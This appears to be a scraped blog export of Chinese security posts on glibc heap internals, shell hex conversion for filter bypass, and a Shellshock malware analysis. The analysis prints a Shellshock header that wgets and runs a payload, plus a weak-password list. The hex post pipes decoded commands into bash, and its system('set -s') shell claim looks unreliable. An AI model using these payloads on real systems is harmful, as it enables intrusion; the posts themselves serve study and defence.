https://github.com/sploitfun/lsploits/tree/master/glibc malloc.c源码。 1、堆的介绍（1）堆在内存空间中不一定连续 （2）堆可由用户管理 常见的分配堆的方式： dlmalloc : general purpose allocator ptmalloc2 : glibc jemalloc : FreeBSD 、Firefox and Android tcmalloc : Google Chrome libumem : Solaris 本文主要学习介绍在linux glibc使用的ptmalloc2实现原理。 本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的prmalloc2代替了。 当然在linux平台*malloc本质上都是通过系统调用brk或者mmap实现的。关于这部分内容，一定要学习下面这篇文章： https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/ 鉴于篇幅，本文就不加以详细说明了，只是为了方便后面对堆内存管理的理解，截取其中函数调用关系图： 系统内存分布图： 2、实验演示试想有如下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* Per thread arena example. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123; printf(\"Before malloc in thread 1\\n\"); getchar(); char* addr = (char*) malloc(1000); printf(\"After malloc and before free in thread 1\\n\"); getchar(); free(addr); printf(\"After free in thread 1\\n\"); getchar();&#125;int main() &#123; pthread_t t1; void* s; int ret; char* addr; printf(\"Welcome to per thread arena example::%d\\n\",getpid()); printf(\"Before malloc in main thread\\n\"); getchar(); addr = (char*) malloc(1000); printf(\"After malloc and before free in main thread\\n\"); getchar(); free(addr); printf(\"After free in main thread\\n\"); getchar(); ret = pthread_create(&amp;t1, NULL, threadFunc, NULL); if(ret) &#123; printf(\"Thread creation error\\n\"); return -1; &#125; ret = pthread_join(t1, &amp;s); if(ret) &#123; printf(\"Thread join error\\n\"); return -1; &#125; return 0;&#125; 下面我们依次分析其各个阶段的堆内存分布状况。 Before malloc in main thread 在程序调用malloc之前程序进程中是没有heap segment的，并且在创建在创建线程前，也是没有线程堆栈的。 After malloc in main thread 在主线程中调用malloc之后，就会发现系统给程序分配了堆栈，且这个堆栈刚好在数据段之上： 这就说明它是通过brk系统调用实现的。并且，还可以看出虽然我们只申请了1000字节的数据，但是系统却分配了132KB大小的堆，这是为什么呢？原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以叫做main arena(每个arena中含有多个chunk，这些chunk以链表的形式加以组织)。由于132KB比1000字节大很多，所以主线程后续再申请堆空间的话，就会先从这132KB的剩余部分中申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。 After free in main thread 在主线程调用free之后：从内存布局可以看出程序的堆空间并没有被释放掉，原来调用free函数释放已经分配了的空间并非直接“返还”给系统，而是由glibc 的malloc库函数加以管理。它会将释放的chunk添加到main arenas的bin(这是一种用于存储同类型free chunk的双链表数据结构，后问会加以详细介绍)中。在这里，记录空闲空间的freelist数据结构称之为bins。之后当用户再次调用malloc申请堆空间的时候，glibc malloc会先尝试从bins中找到一个满足要求的chunk，如果没有才会向操作系统申请新的堆空间。如下图所示： Before malloc in thread1 在thread1调用malloc之前：从输出结果可以看出thread1中并没有heap segment，但是此时thread1自己的栈空间已经分配完毕了： After malloc in thread1 在thread1调用malloc之后：从输出结果可以看出thread1的heap segment已经分配完毕了，同时从这个区域的起始地址可以看出，它并不是通过brk分配的，而是通过mmap分配，因为它的区域为b7500000-b7600000共1MB，并不是同程序的data segment相邻。同时，我们还能看出在这1MB中，根据内存属性分为了2部分：0xb7500000-0xb7521000共132KB大小的空间是可读可写属性；后面的是不可读写属性。原来，这里只有可读写的132KB空间才是thread1的堆空间，即thread1 arena。 在thread1调用free之后：同main thread。 3、Arena介绍3.1 Arena数量限制在第2章中我们提到main thread和thread1有自己独立的arena，那么是不是无论有多少个线程，每个线程都有自己独立的arena呢？答案是否定的。事实上，arena的个数是跟系统中处理器核心个数相关的，如下表所示： 1234For 32 bit systems: Number of arena = 2 * number of cores + 1.For 64 bit systems: Number of arena = 8 * number of cores + 1. 3.2 多Arena的管理假设有如下情境：一台只含有一个处理器核心的PC机安装有32位操作系统，其上运行了一个多线程应用程序，共含有4个线程——主线程和三个用户线程。显然线程个数大于系统能维护的最大arena个数（2*核心数 + 1= 3），那么此时glibc malloc就需要确保这4个线程能够正确地共享这3个arena，那么它是如何实现的呢？ 当主线程首次调用malloc的时候，glibc malloc会直接为它分配一个main arena，而不需要任何附加条件。 当用户线程1和用户线程2首次调用malloc的时候，glibc malloc会分别为每个用户线程创建一个新的thread arena。此时，各个线程与arena是一一对应的。但是，当用户线程3调用malloc的时候，就出现问题了。因为此时glibc malloc能维护的arena个数已经达到上限，无法再为线程3分配新的arena了，那么就需要重复使用已经分配好的3个arena中的一个(main arena, arena 1或者arena 2)。那么该选择哪个arena进行重复利用呢？ 1)首先，glibc malloc循环遍历所有可用的arenas，在遍历的过程中，它会尝试lock该arena。如果成功lock(该arena当前对应的线程并未使用堆内存则表示可lock)，比如将main arena成功lock住，那么就将main arena返回给用户，即表示该arena被线程3共享使用。 2)而如果没能找到可用的arena，那么就将线程3的malloc操作阻塞，直到有可用的arena为止。 3)现在，如果线程3再次调用malloc的话，glibc malloc就会先尝试使用最近访问的arena(此时为main arena)。如果此时main arena可用的话，就直接使用，否则就将线程3阻塞，直到main arena再次可用为止。 这样线程3与主线程就共享main arena了。至于其他更复杂的情况，以此类推。 4、堆管理介绍4.1 整体介绍在glibc malloc中针对堆管理，主要涉及到以下3种数据结构： heap_info: 即Heap Header，因为一个thread arena（注意：不包含main thread）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。那么在什么情况下一个thread arena会包含多个heaps呢?在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等(这些概念会在后文详细介绍): 123456789101112131415161718192021222324struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小(这里给“就是”加上引号，说明这种表示并不准确，但是为了方便理解就暂时这么描述了，详细说明见后文)。每个chunk都由一个结构体malloc_chunk表示： 12345678910struct malloc_chunk &#123; /* #define INTERNAL_SIZE_T size_t */ INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. 这两个指针只在free chunk中存在*/ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 可能有很多读者会疑惑：该结构体里面并没有一个类似于data的字段来表示用户申请到的堆内存空间啊？且该结构体明确含有2个size_t类型的成员，4个指针，这不就意味着malloc_chunk的大小是固定的了么？那它又如何能够根据用户的请求分配不同大小的内存呢？要想回答清楚这个问题，需要我们完全理解整个glibc malloc的堆内存管理机制，同时，本文的主要目的之一就是希冀解释清楚这个概念，鉴于这部分内容较多，我将在后文的第5章加以详细介绍。 NOTE: 1.Main thread不含有多个heaps所以也就不含有heap_info结构体。当需要更多堆空间的时候，就通过扩展sbrk的heap segment来获取更多的空间，直到它碰到内存mapping区域为止。 2.不同于thread arena，main arena的arena header并不是sbrk heap segment的一部分，而是一个全局变量！因此它属于libc.so的data segment。 4.2 heap segment与arena关系首先，通过内存分布图理清malloc_state与heap_info之间的组织关系。 下图是只有一个heap segment的main arena和thread arena的内存分布图： 图4-1 只含一个heap segment的main arena与thread arena图 下图是一个thread arena中含有多个heap segments的情况： 图4-2 一个thread arena含有多个heap segments的内存分布图 从上图可以看出，thread arena只含有一个malloc_state(即arena header)，却有两个heap_info(即heap header)。由于两个heap segments是通过mmap分配的内存，两者在内存布局上并不相邻而是分属于不同的内存区间，所以为了便于管理，libc malloc将第二个heap_info结构体的prev成员指向了第一个heap_info结构体的起始位置（即ar_ptr成员），而第一个heap_info结构体的ar_ptr成员指向了malloc_state，这样就构成了一个单链表，方便后续管理。 5、对chunk的理解在glibc malloc中将整个堆内存空间分成了连续的、大小不一的chunk，即对于堆内存管理而言chunk就是最小操作单位。Chunk总共分为4类： 1)allocated chunk; 2)free chunk; 3)top chunk; 4)Last remainder chunk。 从本质上来说，所有类型的chunk都是内存中一块连续的区域，只是通过该区域中特定位置的某些标识符加以区分。为了简便，我们先将这4类chunk简化为2类：allocated chunk以及free chunk，前者表示已经分配给用户使用的chunk，后者表示未使用的chunk。 众所周知，无论是何种堆内存管理器，其完成的核心目的都是能够高效地分配和回收内存块(chunk)。因此，它需要设计好相关算法以及相应的数据结构，而数据结构往往是根据算法的需要加以改变的。既然是算法，那么算法肯定有一个优化改进的过程，所以本文将根据堆内存管理器的演变历程，逐步介绍在glibc malloc中chunk这种数据结构是如何设计出来的，以及这样设计的优缺点。 PS:鉴于时间和精力有限，后文介绍的演变历程并没有加以严格考证，笔者只是按照一些参考书籍、自己的理解以及便于文章内容安排做出的“善意的捏造”，如有错误，欢迎大家斧正！ 5.1 隐式链表技术前文说过，任何堆内存管理器都是以chunk为单位进行堆内存管理的，而这就需要一些数据结构来标志各个块的边界，以及区分已分配块和空闲块。大多数堆内存管理器都将这些边界信息作为chunk的一部分嵌入到chunk内部，典型的设计如下所示： 图5-1 简单的allocated chunk格式 图5-2 简单的free chunk格式 堆内存中要求每个chunk的大小必须为8的整数倍，因此chunk size的后3位是无效的，为了充分利用内存，堆管理器将这3个比特位用作chunk的标志位，典型的就是将第0比特位用于标记该chunk是否已经被分配。这样的设计很巧妙，因为我们只要获取了一个指向chunk size的指针，就能知道该chunk的大小，即确定了此chunk的边界，且利用chunk size的第0比特位还能知道该chunk是否已经分配，这样就成功地将各个chunk区分开来。注意在allocated chunk中padding部分主要是用于地址对齐的(也可用于对付外部碎片)，即让整个chunk的大小为8的整数倍。 通过上面的设计，我们就能将整个堆内存组织成一个连续的已分配或未分配chunk序列: 图5-3 简单的chunk序列 上面的这种结构就叫做隐式链表。该链表隐式地由每个chunk的size字段链接起来，在进行分配操作的时候，堆内存管理器可以通过遍历整个堆内存的chunk，分析每个chunk的size字段，进而找到合适的chunk。 细心的读者可能发现：这种隐式链表效率其实是相当低的，特别是在内存回收方面，它难以进行相邻多个free chunk的合并操作。我们知道，如果只对free chunk进行分割，而不进行合并的话，就会产生大量小的、无法继续使用的内部碎片，直至整个内存消耗殆尽。因此堆内存管理器设计了带边界标记的chunk合并技术。 1.带边界标记的合并技术试想如下场景：假设我们要释放的chunk为P，它紧邻的前一个chunk为FD，紧邻的后一个chunk为BK，且BK与FD都为free chunk。将P于BK合并在一起是很容易的，因为可以通过P的size字段轻松定位到BK的开始位置，进而获取BK的size等等，但是将P于FD合并却很难，我们必须从头遍历整个堆，找到FD，然后加以合并，这就意味着每次进行chunk释放操作消耗的时间与堆的大小成线性关系。为了解决这个问题，Knuth提出了一种聪明而通用的技术——边界标记。 Knuth在每个chunk的最后添加了一个脚部(Footer)，它就是该chunk 头部(header)的一个副本，我们称之为边界标记： 图5-4 改进版的chunk格式之Knuth边界标记 显然每个chunk的脚部都在其相邻的下一个chunk的头部的前4个字节处。通过这个脚部，堆内存管理器就可以很容易地得到前一个chunk的起始位置和分配状态，进而加以合并了。 但是，边界标记同时带来了一个问题：它要求每个块都包含一个头部和脚部，如果应用程序频繁地进行小内存的申请和释放操作的话(比如1，2个字节)，就会造成很大的性能损耗。同时，考虑到只有在对free chunk进行合并的时候才需要脚部，也就是说对于allocated chunk而言它并不需要脚部，因此我们可以对这个脚部加以优化——将前一个chunk的已分配/空闲标记位存储在当前chunk的size字段的第1，或2比特位上，这样如果我们通过当前chunk的size字段知道了前一个chunk为free chunk，那么就可得出结论：当前chunk地址之前的4个字节为前一个free chunk的脚部，我们可以通过该脚部获取前一个chunk的起始位置；如果当前chunk的size字段的标记位表明前一个chunk是allocated chunk的话，那么就可得出另一个结论：前一个chunk没有脚部，即当前chunk地址之前的4个字节为前一个allocated chunk的payload或padding的最后部分。新的chunk格式图如下： 图5-5 改进版的Knuth边界标记allocated chunk格式 图5-6 改进版的Knuth边界标记free chunk格式 2.再进化——支持多线程随着技术的发展，特别是堆内存管理器添加对多线程的支持，前述的chunk格式已经难以满足需求，比如，我们需要标志位来标记当前chunk是否属于非主线程即thread arena，以及该chunk由mmap得来还是通过brk实现等等。但此时chunk size只剩下一个比特位未使用了，怎么办呢？这需要对chunk格式进行大手术！ 首先思考：是否有必要同时保存当前chunk和前一个chunk的已分配/空闲标记位？答案是否定的，因为我们只需要保存前一个chunk的分配标志位就可以了，至于当前chunk的分配标志位，可以通过查询下一个chunk的size字段得到。那么size字段中剩下的两个比特位就可以用于满足多线程的标志需求了： 图5-7 多线程版本Knuth边界标记allocated chunk格式 图5-8 多线程版本Knuth边界标记free chunk格式 这里的P,M,N的含义如下： PREV_INUSE(P): 表示前一个chunk是否为allocated。 IS_MMAPPED(M)：表示当前chunk是否是通过mmap系统调用产生的。 NON_MAIN_ARENA(N)：表示当前chunk是否是thread arena。 再进一步，发现没必要保存chunk size的副本，也就是说Footer的作用并不大，但是如果前一个chunk是free的话，在合并的时候我们又需要知道前一个chunk的大小，怎么办呢？将Footer从尾部移到首部，同时其不再保存当前chunk的size，而是前一个free chunk的size不就行了。同样的，为了提高内存利用率，如果前一个chunk是allocated chunk的话，这个Footer就作为allocated chunk的payload或padding的一部分，结构图如下： 图5-9 当前glibc malloc allocated chunk格式 图5-10 当前glibc malloc free chunk格式 至此，glibc malloc堆内存管理器中使用的隐式链表技术就介绍完毕了。现在我们再回过头去看malloc_chunk结构体就很好理解了：该结构体通过每个chunk的prev_size和size构成了隐式链表，而后续的fd, bk等指针并不是作用于隐式链表的，而是用于后文会介绍的用于加快内存分配和释放效率的显示链表bin(还记得bin么？用于记录同一类型free chunk的链表)，并且这些指针跟prev_size一样只在free chunk中存在。关于显示链表bin的原理比较复杂，让我们带着疑惑，暂时略过这部分信息，等介绍完所有chunk之后再加以详细介绍。 5.2 Top Chunk当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。该chunk并不属于任何bin，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。 5.3 Last Remainder Chunk要想理解此chunk就必须先理解glibc malloc中的bin机制。如果你已经看了第二部分文章，那么下面的原理就很好理解了，否则建议你先阅读第二部分文章。对于Last remainder chunk，我们主要有两个问题：1)它是怎么产生的；2)它的作用是什么？ 先回答第一个问题。还记得第二部分文章中对small bin的malloc机制的介绍么？当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。 然后回答第二个问题。此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。 作者：走位@阿里聚安全，更多安全技术文章，请点击阿里聚安全博客","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"获取shell的方法总结","date":"2017-09-09T17:31:58.000Z","path":"2017/09/10/获取shell的方法总结/","text":"最近做了一下pwnable.kr上面的题，对某些内容有了一定的感想，特别是获取shell这方面！ 姿势1 linux下的C++程序中： system(&#39;set -s&#39;); 其执行效果相当于获取一个shell","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"shell","slug":"shell","permalink":"http://yoursite.com/tags/shell/"}]},{"title":"shell下的进制转换","date":"2017-09-09T13:44:35.000Z","path":"2017/09/09/shell下的进制转换/","text":"最近一直在学filter绕过的姿势，所以急需shell下绕过的方法，其中关键的一环就是shell下的进制转换！ 主要参考： https://stackoverflow.com/questions/1604765/linux-shell-scripting-hex-string-to-bytes https://stackoverflow.com/questions/6292645/convert-binary-data-to-hex-in-shell-script 进制转换有多种工具，在linux上常见的有hexdump、od -x、xxd等 下面我们来简单介绍一下这些命令 xxdxxd比较常用，也比较好用 12345678910111213141516171819202122Usage: xxd [options] [infile [outfile]] or xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]]Options: -a toggle autoskip: A single '*' replaces nul-lines. Default off. -b binary digit dump (incompatible with -ps,-i,-r). Default hex. -c cols format &lt;cols&gt; octets per line. Default 16 (-i: 12, -ps: 30). -E show characters in EBCDIC. Default ASCII. -e little-endian dump (incompatible with -ps,-i,-r). -g number of octets per group in normal output. Default 2 (-e: 4). -h print this summary. -i output in C include file style. -l len stop after &lt;len&gt; octets. -o off add &lt;off&gt; to the displayed file position. -ps output in postscript plain hexdump style. -r reverse operation: convert (or patch) hexdump into binary. -r -s off revert with &lt;off&gt; added to file positions found in hexdump. -s [+][-]seek start at &lt;seek&gt; bytes abs. (or +: rel.) infile offset. -u use upper case hex letters. -v show version: \"xxd V1.10 27oct98 by Juergen Weigert\". -p：以一个整块输出所有的hex， 不使用空格进行分割 上面的是xxd的用法，下面我们来逐步介绍！ 将0x313233解释成123 root@test:/# echo 0x313233| xxd -r 123root@test:/# 将123解释成0x313233 root@test:/# echo 123|xxd -ps3132330a 需要注意的是，我们不能直接使用xxd -r 0x313233，原因是xxd后面只能接文件！而echo 123，并用管道连接，其实就是创建了一个临时文件交给xxd来处理 局限​ 每行有限定字符个数，xxd -ps限定每行最多有60个16进制数 ​ 而xxd -r则至多转换16个字符 解决办法12345root@test:/# echo \"export FF=\\\"/tmp/flag\\\";cat \\$FF;echo vunerable\"|xxd -p6578706f72742046463d222f746d702f666c6167223b636174202446463b6563686f2076756e657261626c650aroot@test:/# echo \"export FF=\\\"/tmp/flag\\\";cat \\$FF;echo vunerable\"|xxd -p|tr -d '\\n'6578706f72742046463d222f746d702f666c6167223b636174202446463b6563686f2076756e657261626c650aroot@test:/# 12345root@test:/# echo \"export FF=\\\"/tmp/flag\\\"\"|xxd -p6578706f72742046463d222f746d702f666c6167220aroot@test:/# echo 0x6578706f72742046463d222f746d702f666c616722|xxd -rpexport FF=\"/tmp/root@test:/# echo 0x6578706f72742046463d222f746d702f666c616722|xxd -r -pexport FF=\"/tmp/flag\"root@test:/# 注意 对于字符串转16进制中每行60个16进制的限制，可以使用echo 123|xxd -p|tr -d &#39;\\n&#39; 对于16进制转字符串中至多转换16个字符的限制，可以使用xxd -r -p中的r和p一定得分开 应用12345root@test:/# echo \"flag is here\" &gt; /tmp/flagroot@test:/# echo \"\\\"export FF='/tmp/flag';cat \\$FF\\\"\"|xxd -p|tr -d '\\n'226578706f72742046463d272f746d702f666c6167273b63617420244646220aroot@test:/# root@test:/# echo 0x226578706f72742046463d272f746d702f666c6167273b6361742024464622|xxd -r -p|xargs bash -cflag is here 上面的应用综合利用了所学的知识，其中前两步是铺垫，最后一步才是真正的poc。需要注意的是bash -c 一定接字符串，而且该字符串需要用双引号括起来！ 1234567root@test:/# echo \"flag is here\" &gt; /tmp/flagroot@test:/# echo \"export FF='/tmp/flag';cat \\$FF\"|xxd -p|tr -d '\\n'6578706f72742046463d272f746d702f666c6167273b636174202446460aroot@test:/# root@test:/# echo 0x6578706f72742046463d272f746d702f666c6167273b63617420244646|xxd -r -p|bash -iroot@test:/# export FF='/tmp/flag';cat $FFflag is hereroot@test:/# exit 上面同样是十分完美的应用，主要特点是使用了bash -i，这相当于一个交互式的应用，管道线前面输出的内容会在这个交互中完成，完成后立刻退出！注意，管道线前面输出的内容不能用双引号括起来！ perl的妙用12345cat found | sed &apos;s/.*: &quot;//g;s/ .*//;s/^0*//&apos; | xargs python -c &apos;import sys; print &quot;&quot;.join([bin(int(x)).lstrip(&quot;0b&quot;) for x in sys.argv[1:]])&apos; | perl -lpe &apos;$_=pack(&quot;B*&quot;,$_)&apos;最后的代码意思是前面管道输入的01字符串打包成8字节的字符串将A\\B两种不同代码替换，并输出成字符串echo ABBBAAAABBBBBABBABBBABBB | perl -pe &apos;BEGIN &#123; binmode \\*STDOUT &#125; chomp; tr/AB/\\0\\1/; $_ = pack &quot;B*&quot;, $_&apos;","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"shell","slug":"shell","permalink":"http://yoursite.com/tags/shell/"}]},{"title":"shellshock原理介绍","date":"2017-09-09T05:18:47.000Z","path":"2017/09/09/shellshock原理介绍/","text":"一.漏洞事件介绍1.漏洞信息123●发布时间:2014-09-25 14时48分04秒●CVE ID:CVE-2014-6271●受影响版本: 2.漏洞概述Bash(GNU Bourne-Again Shell)是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中，以实现windows的POSIX虚拟接口. Bash其广泛的使用将意味全球至少 150 万的主机将受到影响，此外 Linux/Unix 世界内的安卓和苹果都难以幸免。 破壳漏洞（ShellShock）的严重性被定义为 10 级（最高）,而今年 4 月爆发的 OpenSSL(心脏出血)漏洞才 5 级！ 3.漏洞成因:Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统 受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令 4.漏洞测试:1234(1).CVE-2014-6271 测试方式: env x='() &#123; :;&#125;; exp' bash -c \"echo this is a test\" (2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过) env -i X=';() &#123; (a)=&gt;\\' bash -c 'echo date'; cat echo 5.修复方案12345请广大站长及时关注官网的安全补丁更新(1).针对RedHat、CentOS Liunx发行版本，请执行： yum -y update bash(2).针对Debian Liunx发行版本，请执行： sudo apt-get update &amp;&amp; sudo apt-get install --only-upgrade bash 二.样本概述●样本来源:由于2014年9月24日法国某Linux爱好者公布了BASH漏洞(CVE-2014-6721),时至今日网络上已有利用该漏洞的病毒样本,我们于今日捕获到该漏洞样本,并进行了紧急分析 ●文件信息:文件名:nginx 文件大小:525KB MD5:5924bcc045bb7039f55c6ce29234e29a ●行为概述:该漏洞样本利用Bash漏洞进行传播扩散,并使用Linux Shell命令wget下载该样本并执行,该样本执行后首先会收集系统相关的信息(CPU,网络配置等信息),紧接着样本连接到自己的服务器,通过接受服务器发送的指令,来远程控制被感染机器,进而组建僵尸网络,进行洪水攻击,以及入侵中国某厂商,而入侵之后主要是为了莱特币的挖取 三.样本详细分析1.样本传播方式该样本利用Bash漏洞进行传播,其漏洞的利用只需要简单的几行命令即可,这无疑为利用者带来了极大的便利,利用代码如下: 而该样本通过wget将样本下载并执行,利用漏洞命令如下: 1Cookie, ().&#123;.:;.&#125;;.wget /tmp/besh http://X.X.X.X/nginx; chmod.777 /tmp/besh; /tmp/besh; 2.样本行为分析(1).获取计算机相关信息 该样本启动后首先会获取计算机的相关信息,如CPU,网络配置等信息 (2).接着该样本连接自己的服务器(89.238.150.154:5) strace附加在创建的子进程样本上监视其行为如下: 但是C&amp;C的server已经挂掉了 (3).如果连接服务器成功,则根据服务器传来的指令,远程控制被感染机器,命令集合如下: 123456789PING GETLOCALIP SCANNER HOLD (DoS Flood) JUNK (DoS Flood) UDP (DoS Flood) TCP (DoS Flood) KILLATTK LOLNOGTFO ●PING命令: 类似于心跳包,测试客户端服务器是否连接成功 ●GETLOCALIP 发送本机IP地址到目标服务器 ●SCANNER 其主要是通过Busybox来对字符进行解析,从而设定扫描攻击目标,然后通过DVR scanner来对目标DVR设备进行扫描,看是否存在DVR漏洞,进而发起攻击 我们通过busybox来对该字符串进行解析得到 然而在样本中,我们发现: DVR Scanner主要测试目标是否存在DVR漏洞,如果存在则尝试通过像”root”,”12345”这样的弱口令进行进行连接,如果连接成功,则执行ps尝试寻找”cmd.so”进程,该进程主要是莱特币矿工相关. 于是可以高度怀疑通过此方法来挖取莱特币 程序中存在的弱口令表 12345678910111213root admin user login guest toor changeme 1234 12345 123456 default pass password ●HOLD (Dos Flood) 对目标服务器进行Hold洪水攻击,通过接受服务器数据包,来指明需要攻击的秒数,并将攻击时间返回给服务器 ●JUNK (DoS Flood) 对目标服务器进行JUNK洪水攻击 ●UDP (DoS Flood) 对目标服务器进行UDP洪水攻击 ●TCP (DoS Flood) 对目标服务器进行TCP洪水攻击 ●KILLATTK 通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程 ●LOLNOGTFO 非法服务器数据包指令 三.后台漏洞检测漏洞爆发之后,我们在后台对全国范围内的相关网站进行了一次统计,我们发现了某公司的NAS设备管理页面存在cgi漏洞,而通过查看网站页面，发现设备是类似“TS-119P”， 设备名都是TS-XX的。 1备注：NAS是一种网络存储设备，现在的很多路由器也支持此功能，如果此设备有漏洞，那么里面的资源都会有被盗的风险。XXX门将会再现江湖 为此我们搭建了一个后台页面,来对网址进行检测,查看是否存在Bash漏洞 检测网址如下: http://fish.ijinshan.com/cgibincheck","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"shell","slug":"shell","permalink":"http://yoursite.com/tags/shell/"}]},{"title":"ARM寄存器结构小记","date":"2017-09-08T14:43:17.000Z","path":"2017/09/08/ARM寄存器结构小记/","text":"ARM处理器共有37个寄存器，被分为若干个组，这些寄存器包括： 31个通用寄存器，包括未分组寄存器R0-R7、分组寄存器R8-R14和程序计数器（ PC 指针），均为32位的寄存器。 6个状态寄存器，包括程序状态寄存器 CPSR 和5个物理状态寄存器 SPSR （用以异常发生时保存 CPSR 的值，异常退出时恢复 CPSR ）。 这些状态寄存器用以标识 CPU 的工作状态及程序的运行状态，均为32位。 具体如下表所示： 用户模式 usr 系统模式 sys 特权模式 svc 中止模式 abt 未定义指令模式 und 外部中断模式 irq 快速中断模式 fiq R0 R0 R0 R0 R0 R0 R0 R1 R1 R1 R1 R1 R1 R1 R2 R2 R2 R2 R2 R2 R2 R3 R3 R3 R3 R3 R3 R3 R4 R4 R4 R4 R4 R4 R4 R5 R5 R5 R5 R5 R5 R5 R6 R6 R6 R6 R6 R6 R6 R8 R8 R8 R8 R8 R8 R8_fiq R9 R9 R9 R9 R9 R9 R9_fiq R10 R10 R10 R10 R10 R10 R10_fiq R11 R11 R11 R11 R11 R11 R11_fiq R12 R12 R12 R12 R12 R12 R12_fiq R13(SP) R13 R13_svc R13_abt R13_und R13_inq R13_fiq R14(LR) R14 R14_svc R14_abt R14_und R14_inq R14_fiq PC(R15) PC PC PC PC PC PC CPSR CPSR CPSR CPSR CPSR CPSR CPSR SPSR_svc SPSR_abt SPSR_und SPSR_inq SPSR_fiq 未分组寄存器 R0 - R7：对于未分组寄存器，它们没有被系统用于特别的用途，因此任何可采用通用寄存器的应用场合都可以使用未分组寄存器。但需要注意一点，未分组寄存器不会因为处理器模式的改变而更改指向的寄存器，因此在所有的处理器模式下未分组寄存器都指向同一个寄存器，当中断或异常处理造成处理器模式转换的时候，由于不同的处理器模式使用了相同的物理寄存器，这就有可能造成寄存器中的数据被破坏。 分组寄存器 R8 - R14对于分组寄存器，它们每一次所访问的物理寄存器和处理器当前的运行模式有关。例如在快速中断模式 fiq下R8-R12访问寄存器 R8_fiq-R12_fiq ；而在其他模式下又访问 R8_usr-R12_usr 。因此它们每个对应着两个不同的寄存器。 对于R13（SP）、R14（LR）来说，每个寄存器对应着6个不同的物理寄存器，其中的一个是用户模式与系统模式共用，另外5个物理寄存器对应于其他5种不同的运行模式。采用以下的记号来区分不同的物理寄存器：R13_&lt; mode &gt;R14_&lt; mode &gt;其中，mode为以下几种模式之一：usr、fiq、irq、svc、abt、und。 R13（SP）寄存器 R13 在 ARM 